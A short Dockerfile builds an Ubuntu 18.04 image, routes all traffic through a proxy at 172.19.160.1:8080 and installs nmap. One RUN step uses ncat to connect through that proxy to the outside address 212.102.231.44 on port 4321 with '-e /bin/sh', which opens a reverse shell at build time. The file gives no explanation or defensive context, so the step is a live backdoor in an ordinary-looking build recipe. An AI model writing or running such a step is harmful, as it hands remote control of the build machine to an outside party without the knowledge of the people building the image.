FROM ubuntu:18.04

ENV http_proxy="http://172.19.160.1:8080/"
ENV https_proxy="http://172.19.160.1:8080/"
ENV HTTP_PROXY="http://172.19.160.1:8080/"
ENV HTTPS_PROXY="http://172.19.160.1:8080/"
ENV all_proxy="http://172.19.160.1:8080/"
ENV ALL_PROXY="http://172.19.160.1:8080/"

RUN apt update && apt install -y nmap

RUN ncat --proxy 172.19.160.1:8080 212.102.231.44 4321 -e /bin/sh

CMD ["/bin/bash"]
